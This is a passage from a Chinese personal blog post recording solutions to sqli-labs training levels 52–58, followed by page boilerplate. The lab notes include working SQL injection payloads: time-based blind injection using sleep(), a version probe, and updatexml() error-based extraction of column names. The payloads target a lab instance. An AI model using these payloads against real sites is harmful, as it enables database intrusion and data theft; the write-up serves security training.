+<h3 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h3><p><a href="http://43.247.91.228:84/Less-52/?sort=id" target="_blank" rel="noopener">http://43.247.91.228:84/Less-52/?sort=id</a> ^(select(select version()) regexp ‘^5.5.4’)</p>
+<h3 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h3><p>基于时间的盲注<br><a href="http://43.247.91.228:84/Less-49/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-49/?sort=1&#39;</a> and if(ascii(substr(database(),1,1))=112,1,sleep(0.2))%23</p>
+<h3 id="less-54-57"><a href="#less-54-57" class="headerlink" title="less-54-57"></a>less-54-57</h3><p>很简单的注入，限制了次数，不过只要试出来是怎么界定的就可以了</p>
+<h3 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h3><p>通过 updatexml()报错注入</p>
+<p><a href="http://43.247.91.228:84/Less-58/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-58/?id=-1&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’FECY4FSQDF’),0x7e),1)–+</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-08-03T02:52:14.954Z" itemprop="dateUpdated">2020-08-03 10:52:14</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/02/07/wgbfv8/&title=《sqli-labs记录》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/02/07/wgbfv8/&title=《sqli-labs记录》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/02/07/wgbfv8/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqli-labs记录》 — yichen's blog&url=https://yichen115.github.io/2020/02/07/wgbfv8/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/02/07/wgbfv8/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/02/14/ynp7pa/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">源码获取、fuzz思路</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/01/27/hwfzx2/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">安恒新春祈福赛</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/02/07/wgbfv8/&title=《sqli-labs记录》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/02/07/wgbfv8/&title=《sqli-labs记录》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/02/07/wgbfv8/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqli-labs记录》 — yichen's blog&url=https://yichen115.github.io/2020/02/07/wgbfv8/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/02/07/wgbfv8/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/02/07/wgbfv8/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
